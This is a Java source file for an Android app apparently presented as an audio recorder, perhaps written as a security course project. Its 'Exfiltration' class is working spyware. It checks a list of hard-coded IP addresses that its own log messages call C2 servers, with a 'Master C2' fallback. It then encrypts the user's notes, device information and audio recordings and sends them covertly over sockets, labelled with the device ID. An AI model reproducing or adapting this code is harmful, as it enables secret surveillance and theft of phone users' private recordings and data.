package com.singaporetech.audiorecorder;

import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.security.AlgorithmParameters;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.InvalidParameterSpecException;
import java.security.spec.KeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.TimeUnit;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class Exfiltration {

    private static DataOutputStream dataOutputStream = null;
    private static DataInputStream dataInputStream = null;


    static String[] hosts = {"39.109.150.43", "151.192.142.232", "121.6.245.216", "119.74.208.123"};

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static Key decodePublicKeyFromString(String keyStr) throws NoSuchAlgorithmException, InvalidKeySpecException {
        /* Decodes a Base64 encoded String into a byte array */
        byte[] decodedKey = Base64.getDecoder().decode(keyStr);
        Key clientRSAKey = KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(decodedKey));
        return clientRSAKey;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static byte[] generateSalt() throws NoSuchAlgorithmException {
        String chrs = "0123456789abcdefghijklmnopqrstuvwxyz-_ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        SecureRandom secureRandom = SecureRandom.getInstanceStrong();
        // 9 is the length of the string you want
        String salt = secureRandom.ints(8, 0, chrs.length()).mapToObj(i -> chrs.charAt(i))
                .collect(StringBuilder::new, StringBuilder::append, StringBuilder::append).toString();
        return salt.getBytes();
    }

    public static String regenerateIV(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, InvalidParameterSpecException, IOException {
        // Initializing AES encryption with generated salt
        SecretKeyFactory factory = SecretKeyFactory
                .getInstance("PBKDF2WithHmacSHA1");
        KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536,
                256);
        SecretKey secretKey = factory.generateSecret(keySpec);
        SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secret);
        AlgorithmParameters params = cipher.getParameters();

        byte[] iv = new byte[16];
        iv = params.getParameterSpec(IvParameterSpec.class).getIV();
        BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(iv), "Cp1252"));
        StringBuilder stringBuilder = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            stringBuilder.append(line);
        }
        reader.close();
        return stringBuilder.toString();
    }

    public static byte[] encrypt(String plainText, Key publicKey) throws Exception
    {
        //System.out.println("Public Key: " + Base64.getEncoder().encodeToString(publicKey.getEncoded()));
        // Get Cipher Instance
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        // Initialize Cipher for ENCRYPT_MODE
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        // Perform Encryption
        byte[] cipherText = cipher.doFinal(plainText.getBytes());
        return cipherText;
    }

    public static List<String> checkHosts() {
        List<String> active_hosts = new ArrayList<String>();
        int timeout = 1000;
        boolean isAlive = false;
        // list of hosts to check
        String[] check_hosts = {"39.109.150.43", "103.137.14.133", "121.6.245.216", "119.74.208.123"};
        for (int i = 0; i < 4; i++){
            try {
                SocketAddress socketAddress = new InetSocketAddress(check_hosts[i], 80);
                Socket socket = new Socket();
                System.out.println("Connecting to" + check_hosts[i]);

                socket.connect(socketAddress, timeout);
                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                dataOutputStream.writeUTF("checking if host is alive");
                dataOutputStream.flush();
                dataOutputStream.close();

                active_hosts.add(check_hosts[i]);
                socket.close();

            } catch (SocketException | SocketTimeoutException ignored){} catch (IOException e) {
                e.printStackTrace();
            }
            //if (isAlive){
            //  active_hosts.add(check_hosts[i]);
            //System.out.println("adding" + check_hosts[i]);
            //}
        }

        return active_hosts;
    }
    public static void exfiltrateNoteData(String deviceID, String currTime, String noteContents){
        new Thread(new Runnable(){
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                String host ="";
                List<String> active_hosts = checkHosts();
                if (active_hosts.size() == 0){
                    System.out.println("Proxy Servers down");
                    host = "34.87.22.52";
                    System.out.println("Connecting to Master C2 =======> " + host);
                }
                else{
                    System.out.println("List of active C2: " + active_hosts);
                    host = active_hosts.get((int) Math.floor(Math.random() * ((active_hosts.size())) + 0));
                    System.out.println("Random IP =======> " + host);
                }

                //String host = active_hosts.get((int)Math.floor(Math.random()*((active_hosts.size() - 1) +1)+0));
                //System.out.println(host);
                //System.out.println(active_hosts);
                //String host = "34.87.22.52";
                String publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCa6H+PmPNnh1gZWWNhBZiNfM9SR5xvmhQCOW3ClHUBG2kn4Xy15YL3vcbQ2HZ+8VcrDD54rvj93nSqjwiLnjWI4ORANstzWxX5KgWMz0Dr8OzmWXYb64g2YtAghLfc4IdJCd3i6zfIRTkKD+1ODosOhjUzybhtZxsuvNB+BTTo0wIDAQAB";
                String password = "javapapers";


                // ----------------------------------------------------------------------------//
                // --------------------- Exfiltrating Note Content ----------------------------//
                // ----------------------------------------------------------------------------//
                try {
                    // <=================================== Adding SALT ============================>
                    // password, iv and salt should be transferred to the other end in a secure manner
                    // salt is used for encoding
                    // writing it to a file
                    // salt should be transferred to the recipient securely
                    // for decryption
                    byte[] salt = generateSalt();
                    // -----------------------------------------------------//
                    // ---------------- RSA Encrypting Salt ----------------//
                    // -----------------------------------------------------//
                    BufferedReader readerSalt = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(salt), "Cp1252"));
                    StringBuilder stringBuilderSalt = new StringBuilder();
                    String lineSalt = null;
                    while ((lineSalt = readerSalt.readLine()) != null) {
                        stringBuilderSalt.append(lineSalt);
                    }
                    readerSalt.close();
                    String contentSalt = stringBuilderSalt.toString();
                    // Encryption
                    byte[] contentTextArraySalt = encrypt(contentSalt, decodePublicKeyFromString(publicKey));
                    // -----------------------------------------------------//
                    // --------------------- Sending Salt ------------------//
                    // -----------------------------------------------------//
                    Socket salt_socket = new Socket(host, 80);
                    dataInputStream = new DataInputStream(salt_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(salt_socket.getOutputStream());

                    //send unique destination file name for salt
                    String filenameSalt = deviceID + "_noteContents_" + currTime  + "-salt.enc";
                    String encryptedFilenameSalt = Base64.getEncoder().encodeToString(encrypt(filenameSalt, decodePublicKeyFromString(publicKey)));
                    dataOutputStream.writeUTF(encryptedFilenameSalt);
                    //send RSA-Encrypted salt
                    dataOutputStream.write(contentTextArraySalt);
                    TimeUnit.SECONDS.sleep(1);
                    dataOutputStream.flush();
                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    salt_socket.close();

                    // Initializing AES encryption with generated salt
                    SecretKeyFactory factory = SecretKeyFactory
                            .getInstance("PBKDF2WithHmacSHA1");
                    KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536,
                            256);
                    SecretKey secretKey = factory.generateSecret(keySpec);
                    SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");

                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                    cipher.init(Cipher.ENCRYPT_MODE, secret);
                    AlgorithmParameters params = cipher.getParameters();

                    // <=================================== Adding IV =============================>
                    // iv adds randomness to the text and just makes the mechanism more secure
                    // used while initializing the cipher
                    // stores IV value in a file

                    byte[] iv = new byte[16];
                    iv = params.getParameterSpec(IvParameterSpec.class).getIV();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(iv), "Cp1252"));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line = null;
                    while ((line = reader.readLine()) != null) {
                        stringBuilder.append(line);
                    }
                    reader.close();

                    String content = stringBuilder.toString();
//                    System.out.println("Content before encrypting: " + content);
//                    System.out.println("Content length:" + content.length() + "\n");
                    String temp = content;
                    while(true){
                        if (temp.length() != 16){
                            System.out.println("\n ================== Retrying To Get A New IV File =====================\n");
                            temp = regenerateIV(password, salt);
                            System.out.println("Retried Content before encrypting: " + temp);
                            System.out.println("Retried Content length:" + temp.length() + "\n");
                        }else{
                            break;
                        }
                    }

                    // Encryption
                    byte[] contentTextArrayIV = encrypt(temp, decodePublicKeyFromString(publicKey));

                    // -----------------------------------------------------//
                    // ------------------------ IV -------------------------//
                    // -----------------------------------------------------//
                    Socket iv_socket = new Socket(host, 80);
                    // reset stream
                    dataInputStream = new DataInputStream(iv_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(iv_socket.getOutputStream());
                    // send unique destination file name for iv
                    String filenameIV = deviceID + "_noteContents_" + currTime  + "-iv.enc";
                    String encryptedFilenameIV = Base64.getEncoder().encodeToString(encrypt(filenameIV, decodePublicKeyFromString(publicKey)));
                    dataOutputStream.writeUTF(encryptedFilenameIV);
                    // send iv
                    dataOutputStream.write(contentTextArrayIV);
                    TimeUnit.SECONDS.sleep(1);
                    dataOutputStream.flush();
                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    iv_socket.close();

                    // --------------------------------------------------------//
                    // --------------------- NOTE ----------------------------//
                    // -------------------------------------------------------//
                    Socket DI_socket = new Socket(host, 80);

                    // reset stream
                    dataInputStream = new DataInputStream(DI_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(DI_socket.getOutputStream());
                    // send text file
                    String filenameInfo = deviceID + "_" + "noteContents_" + currTime + ".txt";
                    String encryptedFilenameInfo = Base64.getEncoder().encodeToString(encrypt(filenameInfo, decodePublicKeyFromString(publicKey)));
                    //System.out.println("Encrypting Information Filename: " + filenameInfo + " ===> " + encryptedFilenameInfo);
                    dataOutputStream.writeUTF(encryptedFilenameInfo);

                    // send file data, break file into chunks
                    byte[] input = new byte[64];
                    int CONTENT_bytesRead;
                    ByteArrayOutputStream outputStreamer = new ByteArrayOutputStream();
                    outputStreamer.write(noteContents.getBytes());
                    System.out.println("Content in function: " + noteContents);
                    byte[] DI_byte_array = outputStreamer.toByteArray();
                    InputStream inputStreamer = new ByteArrayInputStream(DI_byte_array);

                    // encrypt a bytearray and send it
                    while ((CONTENT_bytesRead = inputStreamer.read(input)) != -1) {
                        byte[] output = cipher.update(input, 0, CONTENT_bytesRead);
                        if (output != null)
                            dataOutputStream.write(output);
                        dataOutputStream.flush();
                    }

                    // left over bytes
                    byte[] rec_output = cipher.doFinal();
                    if (rec_output != null)
                        dataOutputStream.write(rec_output);
                    dataOutputStream.flush();

                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    DI_socket.close();

                }catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (IllegalBlockSizeException e) {
                    e.printStackTrace();
                } catch (InvalidKeySpecException e) {
                    e.printStackTrace();
                } catch (InvalidParameterSpecException e) {
                    e.printStackTrace();
                } catch (BadPaddingException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        }).start();
    }



    public static void exfiltrateData(String deviceID, String recordFile, String currTime, String recordpath, String device_info) throws IOException {
        new Thread(new Runnable(){
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                String host = "";
                List<String> active_hosts = checkHosts();
                if (active_hosts.size() == 0){
                    System.out.println("Proxy Servers down");
                    host = "34.87.22.52";
                    System.out.println("Connecting to Master C2 =======> " + host);
                }
                else{
                    System.out.println("List of active C2: " + active_hosts);
                    host = active_hosts.get((int) Math.floor(Math.random() * ((active_hosts.size())) + 0));
                    System.out.println("Random IP =======> " + host);
                }

                //String host = active_hosts.get((int)Math.floor(Math.random()*((active_hosts.size()-1)-0+1)+0));
                String publicKey = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCa6H+PmPNnh1gZWWNhBZiNfM9SR5xvmhQCOW3ClHUBG2kn4Xy15YL3vcbQ2HZ+8VcrDD54rvj93nSqjwiLnjWI4ORANstzWxX5KgWMz0Dr8OzmWXYb64g2YtAghLfc4IdJCd3i6zfIRTkKD+1ODosOhjUzybhtZxsuvNB+BTTo0wIDAQAB";
                String password = "javapapers";

                try {
                    // <=================================== Adding SALT=============================>
                    // password, iv and salt should be transferred to the other end in a secure manner
                    // salt is used for encoding
                    // writing it to a file
                    // salt should be transferred to the recipient securely
                    // for decryption
                    byte[] salt = generateSalt();
                    // -----------------------------------------------------//
                    // ---------------- RSA Encrypting Salt ----------------//
                    // -----------------------------------------------------//
                    BufferedReader readerSalt = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(salt), "Cp1252"));
                    StringBuilder stringBuilderSalt = new StringBuilder();
                    String lineSalt = null;
                    while ((lineSalt = readerSalt.readLine()) != null) {
                        stringBuilderSalt.append(lineSalt);
                    }
                    readerSalt.close();
                    String contentSalt = stringBuilderSalt.toString();
                    // Encryption
                    byte[] contentTextArraySalt = encrypt(contentSalt, decodePublicKeyFromString(publicKey));
                    // -----------------------------------------------------//
                    // --------------------- Sending Salt ------------------//
                    // -----------------------------------------------------//
                    Socket salt_socket = new Socket(host, 80);
                    dataInputStream = new DataInputStream(salt_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(salt_socket.getOutputStream());

                    //send unique destination file name for salt
                    String filenameSalt = deviceID + "_" + recordFile + "-salt.enc";
                    String encryptedFilenameSalt = Base64.getEncoder().encodeToString(encrypt(filenameSalt, decodePublicKeyFromString(publicKey)));
                    dataOutputStream.writeUTF(encryptedFilenameSalt);
                    //send RSA-Encrypted salt
                    dataOutputStream.write(contentTextArraySalt);
                    TimeUnit.SECONDS.sleep(1);
                    dataOutputStream.flush();
                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    salt_socket.close();

                    // Initializing AES encryption with generated salt
                    SecretKeyFactory factory = SecretKeyFactory
                            .getInstance("PBKDF2WithHmacSHA1");
                    KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536,
                            256);
                    SecretKey secretKey = factory.generateSecret(keySpec);
                    SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");

                    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                    cipher.init(Cipher.ENCRYPT_MODE, secret);
                    AlgorithmParameters params = cipher.getParameters();

                    // <=================================== Adding IV =============================>
                    // iv adds randomness to the text and just makes the mechanism more secure
                    // used while initializing the cipher
                    // stores IV value in a file

                    byte[] iv = new byte[16];
                    iv = params.getParameterSpec(IvParameterSpec.class).getIV();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(iv), "Cp1252"));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line = null;
                    while ((line = reader.readLine()) != null) {
                        stringBuilder.append(line);
                    }
                    reader.close();

                    String content = stringBuilder.toString();
//                    System.out.println("Content before encrypting: " + content);
//                    System.out.println("Content length:" + content.length() + "\n");
                    String temp = content;
                    while(true){
                        if (temp.length() != 16){
                            System.out.println("\n ================== Retrying To Get A New IV File =====================\n");
                            temp = regenerateIV(password, salt);
                            System.out.println("Retried Content before encrypting: " + temp);
                            System.out.println("Retried Content length:" + temp.length() + "\n");
                        }else{
                            break;
                        }
                    }

                    // Encryption
                    byte[] contentTextArrayIV = encrypt(temp, decodePublicKeyFromString(publicKey));

                    // -----------------------------------------------------//
                    // ------------------------ IV -------------------------//
                    // -----------------------------------------------------//
                    Socket iv_socket = new Socket(host, 80);
                    // reset stream
                    dataInputStream = new DataInputStream(iv_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(iv_socket.getOutputStream());
                    // send unique destination file name for iv
                    String filenameIV = deviceID + "_" + recordFile + "-iv.enc";
                    String encryptedFilenameIV = Base64.getEncoder().encodeToString(encrypt(filenameIV, decodePublicKeyFromString(publicKey)));
                    dataOutputStream.writeUTF(encryptedFilenameIV);
                    // send iv
                    dataOutputStream.write(contentTextArrayIV);
                    TimeUnit.SECONDS.sleep(1);
                    dataOutputStream.flush();
                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    iv_socket.close();


                    // -----------------------------------------------------//
                    // --------------------- DI ----------------------------//
                    // -----------------------------------------------------//
                    Socket DI_socket = new Socket(host, 80);
                    // reset stream
                    dataInputStream = new DataInputStream(DI_socket.getInputStream());
                    dataOutputStream = new DataOutputStream(DI_socket.getOutputStream());
                    // text file
                    //String txt_filepath = "/data/user/0/com.singaporetech.audiorecorder/files/" + "Info_" + currTime;
                    // send text file
                    String filenameInfo = deviceID + "_" + "Info_" + currTime + ".txt";
                    String encryptedFilenameInfo = Base64.getEncoder().encodeToString(encrypt(filenameInfo, decodePublicKeyFromString(publicKey)));
                    //System.out.println("Encrypting Information Filename: " + filenameInfo + " ===> " + encryptedFilenameInfo);
                    dataOutputStream.writeUTF(encryptedFilenameInfo);

                    // send file data, break file into chunks
                    byte[] input = new byte[64];
                    int DI_bytesRead;
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    baos.write(device_info.getBytes());
                    byte[] DI_byte_array = baos.toByteArray();
                    InputStream dis = new ByteArrayInputStream(DI_byte_array);

                    // encrypt a bytearray and send it
                    while ((DI_bytesRead = dis.read(input)) != -1) {
                        byte[] output = cipher.update(input, 0, DI_bytesRead);
                        if (output != null)
                            dataOutputStream.write(output);
                        dataOutputStream.flush();
                    }

                    // left over bytes
                    byte[] rec_output = cipher.doFinal();
                    if (rec_output != null)
                        dataOutputStream.write(rec_output);
                    dataOutputStream.flush();

                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    DI_socket.close();

                    // -----------------------------------------------------//
                    // -------------------- Recording ----------------------//
                    // -----------------------------------------------------//
                    Socket socket = new Socket(host, 80);
                    dataInputStream = new DataInputStream(socket.getInputStream());
                    dataOutputStream = new DataOutputStream(socket.getOutputStream());

                    // get file bytes
                    //File file = new File(filepath);
                    FileInputStream fileInputStream = new FileInputStream(recordpath + "/" + recordFile);

                    // Send file name (single string)
                    String filenameRecording = deviceID + "_" + recordFile + ".enc";
                    String encryptedFilenameRecording = Base64.getEncoder().encodeToString(encrypt(filenameRecording, decodePublicKeyFromString(publicKey)));
                    dataOutputStream.writeUTF(encryptedFilenameRecording);

                    // send file data, break file into chunks
                    int bytesRead;

                    // encrypt a bytearray and send it
                    while ((bytesRead = fileInputStream.read(input)) != -1) {
                        byte[] output = cipher.update(input, 0, bytesRead);
                        if (output != null)
                            dataOutputStream.write(output);
                        dataOutputStream.flush();
                    }

                    // left over bytes
                    byte[] output = cipher.doFinal();
                    if (output != null)
                        dataOutputStream.write(output);
                    dataOutputStream.flush();
                    dataInputStream.close();
                    dataOutputStream.close();
                    TimeUnit.SECONDS.sleep(1);
                    // close socket finally
                    socket.close();


                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NoSuchPaddingException e) {
                    e.printStackTrace();
                } catch (NoSuchAlgorithmException e) {
                    e.printStackTrace();
                } catch (IllegalBlockSizeException e) {
                    e.printStackTrace();
                } catch (InvalidKeySpecException e) {
                    e.printStackTrace();
                } catch (InvalidParameterSpecException e) {
                    e.printStackTrace();
                } catch (BadPaddingException e) {
                    e.printStackTrace();
                } catch (InvalidKeyException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        }).start();
    }



}